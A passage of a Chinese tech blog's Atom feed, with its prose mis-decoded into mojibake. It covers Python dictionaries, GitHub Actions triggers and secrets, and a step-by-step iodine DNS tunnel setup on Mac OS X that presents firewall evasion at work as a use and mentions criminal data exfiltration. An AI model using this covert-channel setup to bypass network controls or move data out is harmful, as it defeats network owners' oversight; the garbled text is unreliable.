print(my_dict[8, 7])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸èƒ½ä½¿ç”¨åˆ—è¡¨ï¼Œå› ä¸ºåˆ—è¡¨æ˜¯å¯å˜çš„ï¼Œä¼šæŠ›å‡ºé”™è¯¯ï¼š</span></span><br><span class="line"><span class="comment"># my_list = [8, 7]</span></span><br><span class="line"><span class="comment"># my_dict = &#123;my_list: 15&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">9</span> <span class="number">36</span> <span class="number">81</span></span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure><h3><span id="qian-tao-zi-dian">åµŒå¥—å­—å…¸</span></h3><p>å€¼ä¹Ÿå¯ä»¥æ˜¯å®¹å™¨ç±»å‹ï¼ˆä¾‹å¦‚åˆ—è¡¨ï¼Œå…ƒç»„ï¼Œå­—å…¸ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict_1 = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Max&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">28</span>&#125;</span><br><span class="line">my_dict_2 = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alex&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">25</span>&#125;</span><br><span class="line">nested_dict = &#123;<span class="string">&quot;dictA&quot;</span>: my_dict_1,</span><br><span class="line">               <span class="string">&quot;dictB&quot;</span>: my_dict_2&#125;</span><br><span class="line"><span class="built_in">print</span>(nested_dict)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;dictA&#x27;</span>: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Max&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">28</span>&#125;, <span class="string">&#x27;dictB&#x27;</span>: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Alex&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      03. å­—å…¸ â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨ Mac OS X ä¸Šä½¿ç”¨ iodine é…ç½® DNS éš§é“</title>
    <link href="https://qiwihui.com/qiwihui-blog-53/"/>
    <id>https://qiwihui.com/qiwihui-blog-53/</id>
    <published>2022-08-13T01:54:25.430Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>DNS éš§é“ï¼Œæ˜¯éšè”½ä¿¡é“çš„ä¸€ç§ï¼Œé€šè¿‡å°†å…¶ä»–åè®®å°è£…åœ¨DNSåè®®ä¸­ä¼ è¾“å»ºç«‹é€šä¿¡ã€‚</p></blockquote><p>æœ¬æ–‡æ˜¯åœ¨ Mac OS X ä¸Šå®è·µçš„ DNS éš§é“çš„ä¸€ä¸ªè®°å½•ï¼Œå…³äºè¿™ä¸ªæ–¹æ³•çš„åŸç†ï¼Œè¯·å…·ä½“å‚è€ƒ <a href="https://cloud.tencent.com/developer/article/1040276">DNS TunnelingåŠç›¸å…³å®ç°</a>ã€‚</p><span id="more"></span><h2><span id="an-zhuang-he-pei-zhi">å®‰è£…å’Œé…ç½®</span></h2><h3><span id="pei-zhi-yu-ming">é…ç½®åŸŸå</span></h3><p>å‡†å¤‡ä¸€å° VPS ä»¥åŠä¸€ä¸ªåŸŸåï¼ˆæ¯”å¦‚ <code>qiwihui.com</code>ï¼‰ï¼Œåœ¨åŸŸåçš„ DNS é…ç½®ä¸­æ·»åŠ ä¸¤æ¡è®°å½•ï¼š</p><table><thead><tr><th>Name</th><th>Type</th><th>TTL</th><th>Data</th></tr></thead><tbody><tr><td>dns</td><td>A</td><td>1h</td><td><code>vps-ip</code></td></tr><tr><td>dt</td><td>NS</td><td>1h</td><td><a href="http://dns.qiwihui.com">dns.qiwihui.com</a></td></tr></tbody></table><h3><span id="fu-wu-duan">æœåŠ¡ç«¯</span></h3><p>ä»¥ Debian ç³»ç»Ÿä¸ºä¾‹ï¼Œå®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install iodine</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ iodined -f -c -P password 172.18.0.1 dt.qiwihui.com </span><br><span class="line">Opened dns0</span><br><span class="line">Setting IP of dns0 to 172.18.0.1</span><br><span class="line">Setting MTU of dns0 to 1130</span><br><span class="line">Opened IPv4 UDP socket</span><br><span class="line">Listening to dns <span class="keyword">for</span> domain dt.qiwihui.com</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>password</code> æ˜¯å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹å‰çš„å¯†ç ï¼Œ<code>172.18.0.1</code> ä¸ºè™šæ‹Ÿå±€åŸŸç½‘çš„IPåœ°å€ï¼Œå¯è‡ªè¡Œè®¾å®šï¼Œä½†ä¸è¦ä¸ç°æœ‰ç½‘ç»œé‡å¤äº†ã€‚æ­¤æ—¶ï¼ŒæœåŠ¡ç«¯å·²ç»å°±ç»ªã€‚</p><h3><span id="ke-hu-duan-ben-di-an-zhuang-iodine">å®¢æˆ·ç«¯ï¼ˆæœ¬åœ°ï¼‰å®‰è£… <code>iodine</code></span></h3><ol><li>æœ¬åœ°å®‰è£… <code>tuntap</code></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew cask install tuntap</span><br></pre></td></tr></table></figure><ol start="2"><li>å®‰è£… <code>iodine</code></li></ol><p>å› ä¸ºå®˜æ–¹æ²¡æœ‰æä¾› Mac OS X çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œéœ€è¦ä»æºç ç¼–è¯‘ï¼Œæˆ–è€…ä½¿ç”¨æˆ‘å·²ç»è®¾ç½®å¥½çš„ Homebrew tap è¿›è¡Œå®‰è£…ã€‚ä»æºç ç¼–è¯‘ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -c http://code.kryo.se/iodine/iodine-0.7.0.tar.gz</span><br><span class="line">tar zxvf iodine-0.7.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> iodine-0.7.0</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨ Homebrewï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew tap qiwihui/core</span><br><span class="line">brew install qiwihui/core/iodine</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo iodine -f -P password dns.qiwihui.com dt.qiwihui.com</span><br><span class="line">Opened /dev/tun0</span><br><span class="line">Opened IPv4 UDP socket</span><br><span class="line">Sending DNS queries <span class="keyword">for</span> dt.qiwihui.com to &lt;vps-ip&gt;</span><br><span class="line">Autodetecting DNS query <span class="built_in">type</span> (use -T to override).</span><br><span class="line">Using DNS <span class="built_in">type</span> NULL queries</span><br><span class="line">Version ok, both using protocol v 0x00000502. You are user <span class="comment">#1</span></span><br><span class="line">Setting IP of tun0 to 172.18.0.3</span><br><span class="line">Adding route 172.18.0.0/27 to 172.18.0.3</span><br><span class="line">add net 172.18.0.0: gateway 172.18.0.3</span><br><span class="line">Setting MTU of tun0 to 1130</span><br><span class="line">Server tunnel IP is 172.18.0.1</span><br><span class="line">Testing raw UDP data to the server (skip with -r).</span><br><span class="line">Server is at 10.170.0.3, trying raw login: ....failed</span><br><span class="line">Retrying EDNS0 support <span class="built_in">test</span>...</span><br><span class="line">Using EDNS0 extension</span><br><span class="line">Switching upstream to codec Base128</span><br><span class="line">Server switched upstream to codec Base128</span><br><span class="line">No alternative downstream codec available, using default (Raw)</span><br><span class="line">Switching to lazy mode <span class="keyword">for</span> low-latency</span><br><span class="line">Server switched to lazy mode</span><br><span class="line">Autoprobing max downstream fragment size... (skip with -m fragsize)</span><br><span class="line">768 ok.. ...1152 not ok.. 960 ok.. 1056 ok.. 1104 ok.. 1128 ok.. 1140 ok.. will use 1140-2=1138</span><br><span class="line">Setting downstream fragment size to max 1138...</span><br><span class="line">Retrying <span class="built_in">set</span> fragsize...</span><br><span class="line">Retrying <span class="built_in">set</span> fragsize...</span><br><span class="line">Connection setup complete, transmitting data.</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œå®¢æˆ·ç«¯é…ç½®å®Œæˆã€‚</p><h3><span id="ce-shi-he-shi-yong">æµ‹è¯•å’Œä½¿ç”¨</span></h3><p>åœ¨æœ¬åœ°å°è¯• ping 172.18.0.1 å³å¯ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ping 172.18.0.1</span><br><span class="line">PING 172.18.0.1 (172.18.0.1): 56 data bytes</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq=0 ttl=64 time=233.914 ms</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=232.870 ms</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq=2 ttl=64 time=230.201 ms</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq=3 ttl=64 time=268.602 ms</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq=4 ttl=64 time=230.573 ms</span><br><span class="line">^C</span><br><span class="line">--- 172.18.0.1 ping statistics ---</span><br><span class="line">5 packets transmitted, 5 packets received, 0.0% packet loss</span><br><span class="line">round-trip min/avg/max/stddev = 230.201/239.232/268.602/14.751 ms</span><br></pre></td></tr></table></figure><p>è¿™æ—¶ï¼Œåªè¦é€šè¿‡è¿™ä¸ª DNS éš§é“å°±å¯å°±ä¼ é€’å…¶ä»–æ•°æ®äº†ã€‚</p><h2><span id="yong-tu">ç”¨é€”</span></h2><p>å½“é˜²ç«å¢™é™åˆ¶äº†ä¸€äº›ç½‘ç«™çš„è®¿é—®ï¼Œä½†æ˜¯èƒ½è¿›è¡Œ DNS æŸ¥è¯¢æ—¶ï¼Œå¯ä½¿ç”¨è¿™ç§æ–¹æ³•è¿›è¡Œç»•è¿‡ï¼Œæ¯”å¦‚åœ¨å…¬å¸ï¼Œåˆæˆ–è€…åœ¨æŸäº›å›½å®¶ï¼ŒçŠ¯ç½ªåˆ†å­ä¹Ÿå¸¸ç”¨è¿™ä¸­æ–¹å¼è¿›è¡Œå†…ç½‘æ•°æ®ä¼ å‡ºã€‚</p><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="http://code.kryo.se/iodine/%EF%BC%9Aiodine">http://code.kryo.se/iodine/ï¼šiodine</a> å®˜æ–¹ç½‘ç«™ï¼Œ<a href="http://kryo.se">kryo.se</a>: iodine (IP-over-DNS, IPv4 over DNS tunnel)</li><li><a href="https://github.com/yarrick/iodine%EF%BC%9AOfficial">https://github.com/yarrick/iodineï¼šOfficial</a> git repo for iodine dns tunnel</li><li><a href="https://cloud.tencent.com/developer/article/1040276">DNS TunnelingåŠç›¸å…³å®ç°</a></li><li><a href="http://jeremy5189.logdown.com/posts/263029-iodine-ip-over-dns">iodine - IP over DNS</a></li><li><a href="http://wiki.attie.co.uk/wiki/Tunnel_IP_through_DNS">Tunnel IP through DNS</a></li></ul><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-486480977"><strong>shaohuihu</strong></a> on: <strong>4/25/2019</strong></p></blockquote><p>macä¸Šä½¿ç”¨ iodined: open_tun: Failed to open tunneling device: No such file or directoryæ¥¼ä¸»macä¸Šå¦‚ä½•è§£å†³çš„TUN/TAP?</p><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-486482390"><strong>qiwihui</strong></a> on: <strong>4/25/2019</strong></p></blockquote><h2><span id="shaohuihu-ni-xu-yao-tuntap-brew-cask-install-tuntap">@shaohuihu ä½ éœ€è¦tuntapï¼š<code>brew cask install tuntap</code></span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-486503799"><strong>shaohuihu</strong></a> on: <strong>4/25/2019</strong></p></blockquote><h2><span id="qing-wen-zhe-ge-dns-fu-wu-qi-yi-ji-iodine-ke-hu-duan-fu-wu-duan-zi-ji-da-jian-zai-ben-di-hao-shi-bu">è¯·é—®  è¿™ä¸ªdnsæœåŠ¡å™¨ ä»¥åŠiodine å®¢æˆ·ç«¯ æœåŠ¡ç«¯è‡ªå·±æ­å»ºåœ¨æœ¬åœ°å¥½ä½¿ä¸ï¼Ÿ</span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-486529656"><strong>qiwihui</strong></a> on: <strong>4/25/2019</strong></p></blockquote><p>@shaohuihu  åœ¨ç›´è¿æ¨¡å¼ä¸‹å¯çœ‹youtube 720p, ä¸­ç»§æ¨¡å¼ä¸‹æ²¡è¯•è¿‡ï¼Œçœ‹ç›¸å…³æ–‡ç« é€Ÿåº¦ä¹Ÿæ˜¯åœ¨å…¶ä»–å‡ ç§DNS tunnelingä¸­æ˜¯æœ€å¿«çš„ã€‚</p><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-486972412"><strong>shaohuihu</strong></a> on: <strong>4/26/2019</strong></p></blockquote><h2><span id="ke-fu-duan-he-fu-wu-duan-du-pei-zhi-hao-hou-ping-ip-bao-cuo-ping-sendto-no-buffer-space-available-qing-wen-zhe-ge-shi-shi-me-yuan-yin-ni-qiwihui">å®¢æœç«¯å’ŒæœåŠ¡ç«¯éƒ½é…ç½®å¥½åã€‚ping ip æŠ¥é”™ï¼šping: sendto: No buffer space available è¯·é—®è¿™ä¸ªæ˜¯ä»€ä¹ˆåŸå› å‘¢ï¼Ÿ@qiwihui</span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-487355342"><strong>shaohuihu</strong></a> on: <strong>4/28/2019</strong></p></blockquote><h2><span id="qiwihui-zhe-ge-kun-rao-liao-hao-jiu-liao-fu-wu-duan-wo-ye-check-liao-shi-dui-de-ke-hu-duan-ye-lian-jie-wan-cheng-53-duan-kou-wo-ye-kai-fang-liao-fu-wu-duan-he-ke-hu-duan-ban-ben-ye-shi-yi-yang-de-jiu-shi-ping-bu-tong-bu-neng-tong-xin-ni-zhi-dao-wei-shi-me-ma">@qiwihui  è¿™ä¸ªå›°æ‰°äº†å¥½ä¹…äº† æœåŠ¡ç«¯æˆ‘ä¹Ÿcheckäº† æ˜¯å¯¹çš„ï¼Œå®¢æˆ·ç«¯ä¹Ÿè¿æ¥å®Œæˆ53ç«¯å£æˆ‘ä¹Ÿå¼€æ”¾äº†ï¼ŒæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ç‰ˆæœ¬ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯ping ä¸é€šã€‚ä¸èƒ½é€šä¿¡ï¼Œä½ çŸ¥é“ä¸ºä»€ä¹ˆå—</span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-487360896"><strong>qiwihui</strong></a> on: <strong>4/28/2019</strong></p></blockquote><p>@shaohuihu è¿™ä¸ªé—®é¢˜åŸå› å¾ˆå¤šï¼Œå¯æ˜¯è¯•è¯•é‡ç½®ç½‘å¡</p><ol><li>ç¡®å®šä½¿ç”¨çš„ç½‘å¡</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo route -n get 172.18.0.1</span></span><br><span class="line">   route to: 172.18.0.1</span><br><span class="line">destination: 172.18.0.0</span><br><span class="line">       mask: 255.255.255.224</span><br><span class="line">    gateway: 172.18.0.2</span><br><span class="line">  interface: tun0</span><br><span class="line">      flags: &lt;UP,GATEWAY,DONE,STATIC,PRCLONING&gt;</span><br><span class="line"> recvpipe  sendpipe  ssthresh  rtt,msec    rttvar  hopcount      mtu     expire</span><br><span class="line">       0         0         0         0         0         0      1130         0 </span><br></pre></td></tr></table></figure><ol start="2"><li>é‡ç½®</li></ol><h2><span id="sudo-ifconfig-tun0-downsudo-ifconfig-tun0-up"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ifconfig tun0 down</span><br><span class="line">sudo ifconfig tun0 up</span><br></pre></td></tr></table></figure></span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-487361085"><strong>qiwihui</strong></a> on: <strong>4/28/2019</strong></p></blockquote><p>å¯ä»¥å‚è€ƒï¼š</p><ul><li><a href="https://docs.netgate.com/pfsense/en/latest/routing/no-buffer-space-available.html">https://docs.netgate.com/pfsense/en/latest/routing/no-buffer-space-available.html</a></li><li><a href="https://odino.org/ping-sendto-no-buffer-space-available-with-du-dnses/">https://odino.org/ping-sendto-no-buffer-space-available-with-du-dnses/</a></li></ul><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-490726534"><strong>badtoken</strong></a> on: <strong>5/9/2019</strong></p></blockquote><blockquote><p>@shaohuihu è¿™ä¸ªé—®é¢˜åŸå› å¾ˆå¤šï¼Œå¯æ˜¯è¯•è¯•é‡ç½®ç½‘å¡</p><ol><li>ç¡®å®šä½¿ç”¨çš„ç½‘å¡</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo route -n get 172.18.0.1</span></span><br><span class="line">   route to: 172.18.0.1</span><br><span class="line">destination: 172.18.0.0</span><br><span class="line">       mask: 255.255.255.224</span><br><span class="line">    gateway: 172.18.0.2</span><br><span class="line">  interface: tun0</span><br><span class="line">      flags: &lt;UP,GATEWAY,DONE,STATIC,PRCLONING&gt;</span><br><span class="line"> recvpipe  sendpipe  ssthresh  rtt,msec    rttvar  hopcount      mtu     expire</span><br><span class="line">       0         0         0         0         0         0      1130         0 </span><br></pre></td></tr></table></figure><ol><li>é‡ç½®</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ifconfig tun0 down</span><br><span class="line">sudo ifconfig tun0 up</span><br></pre></td></tr></table></figure></blockquote><p>ä½ å¥½ï¼Œè¯·é—®æœ‰winçš„è§£å†³æ–¹æ¡ˆå—ã€‚æˆ‘ç°åœ¨ä¹Ÿæ˜¯pingä¸é€šï¼Œwinå®¢æˆ·ç«¯pingéš§é“çš„æœåŠ¡ç«¯å†…ç½‘åœ°å€ï¼Œæ­»æ´»ä¸é€šï¼ˆpingéš§é“æœåŠ¡ç«¯å¤–ç½‘åœ°å€æ˜¯é€šçš„ï¼‰</p><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/53#issuecomment-490766765"><strong>qiwihui</strong></a> on: <strong>5/9/2019</strong></p></blockquote><p>@badtoken åº”è¯¥ä¹Ÿæœ‰å§ï¼Œæ¯”å¦‚è¿™ä¸ª <a href="https://kb.wisc.edu/helpdesk/page.php?id=6653">https://kb.wisc.edu/helpdesk/page.php?id=6653</a> ï¼Œå…·ä½“æˆ‘ä¹Ÿæ²¡æœ‰è¯•è¿‡</p>]]></content>
    
    <summary type="html">
    
      åœ¨ Mac OS X ä¸Šä½¿ç”¨ iodine é…ç½® DNS éš§é“
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬1å¤©ï¼šCI/CD è§¦å‘å™¨</title>
    <link href="https://qiwihui.com/qiwihui-blog-84/"/>
    <id>https://qiwihui.com/qiwihui-blog-84/</id>
    <published>2022-08-13T01:54:25.430Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub Actionsæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç³»ç»Ÿï¼šå®ƒæä¾›äº† CI/CD æ„å»ºåŠŸèƒ½â”€â”€èƒ½å¤Ÿæ„å»ºå’Œæµ‹è¯• Pull Request å¹¶åˆå¹¶åˆ°ä½ çš„masteråˆ†æ”¯ä¸­â”€â”€ä½†å®ƒä¸åªé™äºæ„å»ºç³»ç»Ÿã€‚ å®ƒå·²ç»é›†æˆåˆ°GitHubä¸­ï¼Œå¹¶ä¸” <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/events-that-trigger-workflows">åªè¦ä½ çš„é¡¹ç›®åº“ä¸­å‘ç”Ÿä»»ä½•äº‹ä»¶</a>ï¼ˆä¾‹å¦‚æ­£åœ¨åˆ›å»ºå‘è¡Œç‰ˆæˆ–æ­£åœ¨è¯„è®ºé—®é¢˜ï¼‰ï¼Œéƒ½å¯ä»¥è§¦å‘å¹¶è¿è¡Œå·¥ä½œæµã€‚</p><p>æˆ‘å°†åœ¨è¿™ä¸ªæœˆæ›´å¤šåœ°è®¨è®ºé‚£äº›é¡¹ç›®åº“è‡ªåŠ¨åŒ–æ–¹æ¡ˆï¼Œä½†æ˜¯ä½ è¦çŸ¥é“ï¼Œè¿™ç§çµæ´»æ€§å°†æœ‰åŠ©äºç†è§£å¦‚ä½•è¿›è¡Œ CI/CD æ„å»ºè®¾ç½®ã€‚ GitHub Actions å…è®¸ä½ å®šä¹‰ä¸€ä¸ª <em>è§¦å‘å™¨</em> æ¥æ§åˆ¶å·¥ä½œæµç¨‹çš„è¿è¡Œæ—¶é—´ã€‚æ¯å½“ä½ çš„é¡¹ç›®åº“ä¸­å‘ç”Ÿä¸è¯¥è§¦å‘å™¨åŒ¹é…çš„æ“ä½œæ—¶ï¼Œå·¥ä½œæµè¿è¡Œéƒ½ä¼šè¿›å…¥æ’é˜Ÿé˜Ÿåˆ—ä¸­å‡†å¤‡ã€‚</p><span id="more"></span><p>å¯¹äº CI/CD å·¥ä½œæµï¼Œæˆ‘å–œæ¬¢ä½¿ç”¨ <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/events-that-trigger-workflows#push-event-push">push</a> å’Œ <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/events-that-trigger-workflows#pull-request-event-pull_request">pull_request</a> è§¦å‘å™¨ï¼Œå¹¶å°†å…¶èŒƒå›´é™å®šåœ¨æˆ‘æ„Ÿå…´è¶£çš„åˆ†æ”¯ä¸Šã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">  <span class="attr">pull_request:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè§¦å‘å™¨å°†åœ¨å¯¹masteråˆ†æ”¯è¿›è¡Œä»»ä½•æ›´æ”¹æ—¶è¿è¡Œä½ çš„å·¥ä½œæµâ”€â”€ï¼ˆå³ä½¿å®ƒçš„åå­—æ˜¯ <code>push</code> è§¦å‘å™¨ï¼Œä¹Ÿå°†åœ¨ä½ è¿è¡Œ <code>git push</code> æˆ–å°† pull request åˆå¹¶åˆ° master åˆ†æ”¯æ—¶è¿è¡Œï¼‰ã€‚å¯¹äºé’ˆå¯¹masteråˆ†æ”¯æ‰“å¼€çš„ä»»ä½• pull requestï¼Œå·¥ä½œæµä¹Ÿå°†è¿è¡Œï¼Œå¹¶ä¸”å°†åœ¨ pull request ä¸­å‘ä½ æ˜¾ç¤ºéªŒè¯ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77157504-749cbd80-6adc-11ea-8fd5-17d745208029.png" alt="image"></p><p>å¦‚æœä½ ç†Ÿæ‚‰YAMLè¯­æ³•ï¼Œå°±å¯èƒ½ä¼šæ³¨æ„åˆ°åˆ†æ”¯é‡‡ç”¨æ•°ç»„ã€‚ å› æ­¤ï¼Œä½ å¯ä»¥è½»æ¾åœ°è®¾ç½®å·¥ä½œæµåœ¨å¤šä¸ªåˆ†æ”¯ä¸­è¿è¡Œï¼Œè¿™åœ¨ä½ ç»´æŠ¤å•ç‹¬çš„å‘å¸ƒè½¨é“è¿½è¸ªæ—¶éå¸¸æœ‰ç”¨ã€‚ ä¾‹å¦‚ï¼š</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;releases/**&#x27;</span></span><br><span class="line">  <span class="attr">pull_request:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;releases/**&#x27;</span></span><br></pre></td></tr></table></figure><p>æ¯å½“å¯¹ <code>master</code> åˆ†æ”¯æˆ–åç§° <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#onpushpull_requestbranchestags">ä»¥ <code>releases/</code> å¼€å¤´çš„åˆ†æ”¯</a> æ‰“å¼€ pull request æ—¶ï¼Œå°†è¿è¡Œä½ çš„å·¥ä½œæµã€‚</p><p>é€šè¿‡ <code>push</code> å’Œ <code>pull_request</code> è§¦å‘å™¨ï¼Œå¯ä»¥è½»æ¾è®¾ç½® CI/CD æ ·å¼çš„å·¥ä½œæµç¨‹æ¥éªŒè¯ pull requestï¼Œå¹¶ä½¿ç”¨ GitHub Actions åˆå¹¶åˆ°ä½ çš„ master åˆ†æ”¯ä¸­ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_1_cicd_triggers.html">https://www.edwardthomson.com/blog/github_actions_1_cicd_triggers.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬1å¤©ï¼šCI/CD è§¦å‘å™¨
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬11å¤©ï¼šå¯†ç ï¼ˆSecretsï¼‰</title>
    <link href="https://qiwihui.com/qiwihui-blog-94/"/>
    <id>https://qiwihui.com/qiwihui-blog-94/</id>
    <published>2022-08-13T01:54:25.430Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©æˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ªåŸºäº<a href="https://qiwihui.com/qiwihui-blog-93/">æ”¹å˜è·¯å¾„</a>è§¦å‘çš„å·¥ä½œæµ; å®ƒçš„ç›®æ ‡æ˜¯å‘å¸ƒæ–‡æ¡£ã€‚å¦‚æœä»”ç»†çœ‹ï¼Œåœ¨å·¥ä½œæµç¨‹çš„åº•éƒ¨ï¼Œæˆ‘ä»¬å¼•ç”¨äº†ä¸€ä¸ªå˜é‡ã€‚çœ‹èµ·æ¥æœ‰ç‚¹åƒæˆ‘ä»¬<a href="https://qiwihui.com/qiwihui-blog-85/">å¼•ç”¨çŸ©é˜µå˜é‡</a>çš„æ–¹å¼ ï¼Œè€Œè¿™é‡Œå¼•ç”¨äº†ä¸€ä¸ªå¯†ç ã€‚</p><p>åœ¨éƒ¨ç½²åœºæ™¯ä¸­ï¼Œä½ é€šå¸¸ä¼šéœ€è¦ä»¤ç‰Œæˆ–å¯†ç ä¹‹ç±»çš„ä¸œè¥¿â”€â”€GitHub Actionsæ”¯æŒå°†è¿™äº›ä½œä¸ºå¯†ç ä¿å­˜åœ¨å­˜å‚¨åº“ä¸­ã€‚</p><p>è¦è®¾ç½®å¯†ç ï¼Œè¯·è½¬åˆ°â€œå­˜å‚¨åº“è®¾ç½®â€é¡µé¢ï¼Œç„¶åé€‰æ‹©â€œå¯†ç â€ã€‚ä½ çš„å¯†ç åç§°å°†åœ¨ä½ çš„å·¥ä½œæµä¸­ç”¨äºå¼•ç”¨æ•°æ®ï¼Œä½ å¯ä»¥å°†å¯†ç æœ¬èº«æ”¾å…¥å€¼ä¸­ã€‚</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/3297411/77734745-39523f80-7044-11ea-8aed-91f6dde277e0.png" 